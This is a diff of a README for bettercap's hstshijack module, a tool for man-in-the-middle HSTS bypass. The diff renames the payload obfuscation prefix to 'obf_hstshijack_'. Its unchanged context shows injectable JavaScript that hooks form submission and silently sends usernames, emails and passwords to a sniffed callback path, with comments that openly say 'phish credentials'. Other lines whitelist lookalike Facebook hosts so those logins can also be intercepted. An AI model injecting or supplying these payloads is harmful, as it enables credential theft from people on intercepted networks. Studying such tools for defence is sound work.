@@ -87,16 +87,16 @@ You should always inject the <a href="./payloads/hijack.js">**hijack.js**</a> pa
 
 You can write custom payloads that are automatically obfuscated by the module.
 
-Basically, every word that was found beginning with `obf_` will be obfuscated.
+Basically, every word that was found beginning with `obf_hstshijack_` will be obfuscated.
 
 Example: 
 
 ```js
-function obf_function() {
-  alert("Random variable: obf_whatever_follows")
+function obf_hstshijack_function() {
+  alert("Random variable: obf_hstshijack_whatever_follows")
 }
 
-obf_function()
+obf_hstshijack_function()
 ```
 
 Will be injected as:
@@ -118,14 +118,14 @@ Example of a silent callback:
 ```js
 form.onsubmit = function() {
   req = new XMLHttpRequest()
-  req.open("POST", "http://" + location.host + "/obf_path_callback?username=" + username + "&password=" + password)
+  req.open("POST", "http://" + location.host + "/obf_hstshijack_path_callback?username=" + username + "&password=" + password)
   req.send()
 }
 ```
 
 The following POST request will be sniffed by bettercap, but not proxied (the request will be dropped). 
 
-Any instance of `obf_path_callback` will be replaced with the callback path (see example above).
+Any instance of `obf_hstshijack_path_callback` will be replaced with the callback path (see example above).
 
 ### Whitelisting callbacks
 
@@ -139,22 +139,22 @@ Example of multiple whitelisting callbacks:
 form.onsubmit = function() {
   // Whitelist current hostname and phish credentials
   req = new XMLHttpRequest()
-  req.open("POST", "http://" + location.hostname + "/obf_path_whitelist?email=" + email + "&password=" + password)
+  req.open("POST", "http://" + location.hostname + "/obf_hstshijack_path_whitelist?email=" + email + "&password=" + password)
   req.send()
 
   // Whitelist facebook
   req = new XMLHttpRequest()
-  req.open("POST", "http://facedook.com/obf_path_whitelist")
+  req.open("POST", "http://facedook.com/obf_hstshijack_path_whitelist")
   req.send()
 
   // Whitelist facebook CDN
   req = new XMLHttpRequest()
-  req.open("POST", "http://static.xx.fdcdn.net/obf_path_whitelist")
+  req.open("POST", "http://static.xx.fdcdn.net/obf_hstshijack_path_whitelist")
   req.send()
 
   // Whitelist redirect to facebook
   req = new XMLHttpRequest()
-  req.open("POST", "http://fd.com/obf_path_whitelist")
+  req.open("POST", "http://fd.com/obf_hstshijack_path_whitelist")
   req.send()
 }
 ```
